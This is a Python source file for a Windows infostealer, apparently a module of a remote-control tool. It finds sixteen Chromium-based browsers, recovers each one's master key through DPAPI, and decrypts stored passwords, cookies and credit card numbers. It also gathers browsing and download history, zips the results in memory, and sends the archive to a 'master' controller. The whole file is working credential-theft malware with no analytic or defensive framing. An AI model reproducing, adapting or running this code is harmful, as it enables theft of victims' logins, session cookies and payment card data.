import io
import os
import json
import base64
import sqlite3
import time
import zipfile

from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import shutil
from datetime import datetime

from tools.send import upload_file

appdata = os.getenv('LOCALAPPDATA')

browsers = {
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}


def get_master_key(path: str):
    if not os.path.exists(path):
        return

    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return

    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_password(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()

    return decrypted_pass



def get_login_data(path: str, profile: str, master_key):
    login_db = f'{path}\\{profile}\\Login Data'
    if not os.path.exists(login_db):
        return
    result = ""
    shutil.copy(login_db, 'login_db')
    conn = sqlite3.connect('login_db')
    cursor = conn.cursor()
    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for row in cursor.fetchall():
        password = decrypt_password(row[2], master_key)
        result += f"""
        URL: {row[0]}
        Email: {row[1]}
        Password: {password}

        """
    conn.close()
    os.remove('login_db')
    return result


def get_credit_cards(path: str, profile: str, master_key):
    cards_db = f'{path}\\{profile}\\Web Data'
    if not os.path.exists(cards_db):
        return

    result = ""
    shutil.copy(cards_db, 'cards_db')
    conn = sqlite3.connect('cards_db')
    cursor = conn.cursor()
    cursor.execute(
        'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        card_number = decrypt_password(row[3], master_key)
        result += f"""
        Name On Card: {row[0]}
        Card Number: {card_number}
        Expires On:  {row[1]} / {row[2]}
        Added On: {datetime.fromtimestamp(row[4])}

        """

    conn.close()
    os.remove('cards_db')
    return result


def get_cookies(path: str, profile: str, master_key):
    cookie_db = f'{path}\\{profile}\\Network\\Cookies'
    if not os.path.exists(cookie_db):
        return
    result = ""
    shutil.copy(cookie_db, 'cookie_db')
    conn = sqlite3.connect('cookie_db')
    cursor = conn.cursor()
    cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue

        cookie = decrypt_password(row[3], master_key)

        result += f"""
        Host Key : {row[0]}
        Cookie Name : {row[1]}
        Path: {row[2]}
        Cookie: {cookie}
        Expires On: {row[4]}

        """

    conn.close()
    os.remove('cookie_db')
    return result


def get_web_history(path: str, profile: str):
    web_history_db = f'{path}\\{profile}\\History'
    result = ""
    if not os.path.exists(web_history_db):
        return

    shutil.copy(web_history_db, 'web_history_db')
    conn = sqlite3.connect('web_history_db')
    cursor = conn.cursor()
    cursor.execute('SELECT url, title, last_visit_time FROM urls')
    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2]:
            continue
        result += f"""
        URL: {row[0]}
        Title: {row[1]}
        Visited Time: {row[2]}

        """
    conn.close()
    os.remove('web_history_db')
    return result


def get_downloads(path: str, profile: str):
    downloads_db = f'{path}\\{profile}\\History'
    if not os.path.exists(downloads_db):
        return
    result = ""
    shutil.copy(downloads_db, 'downloads_db')
    conn = sqlite3.connect('downloads_db')
    cursor = conn.cursor()
    cursor.execute('SELECT tab_url, target_path FROM downloads')
    for row in cursor.fetchall():
        if not row[0] or not row[1]:
            continue
        result += f"""
        Download URL: {row[0]}
        Local Path: {row[1]}

        """

    conn.close()
    os.remove('downloads_db')


def installed_browsers():
    results = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results


def save_results(browser_name, data_type, content):
    dir_path = os.path.join(browser_name)

    if content is not None:
        # Create a file-like object in memory
        file_obj = io.StringIO()
        file_obj.write(content)

        # Get the bytes of the content
        file_bytes = file_obj.getvalue().encode('utf-8')

        filename = f"{data_type}.txt"

        print(f"\t [*] Saved {data_type} in memory")

        return filename, file_bytes, dir_path
    else:
        print(f"\t [-] No Data Found!")
        return None, None, None


def dump_sensible_data(slaver, address):
    available_browsers = installed_browsers()
    files = []

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        print(f"Getting Stored Details from {browser}")

        print("\t [!] Getting Saved Passwords")
        filename, filebytes, dir = save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))
        if filebytes is not None:
            files.append({"filename": os.path.join(dir, filename), "bytes": filebytes})

        print("\t------\n")

        print("\t [!] Getting Browser History")
        filename, filebytes, dir = save_results(browser, 'Browser_History', get_web_history(browser_path, "Default"))
        if filebytes is not None:
            files.append({"filename": os.path.join(dir, filename), "bytes": filebytes})
        print("\t------\n")

        print("\t [!] Getting Download History")
        filename, filebytes, dir = save_results(browser, 'Download_History', get_downloads(browser_path, "Default"))
        if filebytes is not None:
            files.append({"filename": os.path.join(dir, filename), "bytes": filebytes})
        print("\t------\n")

        print("\t [!] Getting Cookies")
        filename, filebytes, dir = save_results(browser, 'Browser_Cookies', get_cookies(browser_path, "Default", master_key))
        if filebytes is not None:
            files.append({"filename": os.path.join(dir, filename), "bytes": filebytes})
        print("\t------\n")

        print("\t [!] Getting Saved Credit Cards")
        filename, filebytes, dir = save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Default", master_key))
        if filebytes is not None:
            files.append({"filename": os.path.join(dir, filename), "bytes": filebytes})

    # Create a zip file in memory
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "a", zipfile.ZIP_DEFLATED, False) as zip_file:
        for file in files:
            zip_file.writestr(file["filename"], file["bytes"])

    zip_buffer.seek(0)
    zip_bytes = zip_buffer.read()
    # Get the current timestamp
    current_time = time.localtime()
    timestamp = time.strftime("%d-%m-%y_%H-%M", current_time)
    slaver.send_file_to_master(address, f"sensible_data_{timestamp}.zip", zip_bytes)
    return
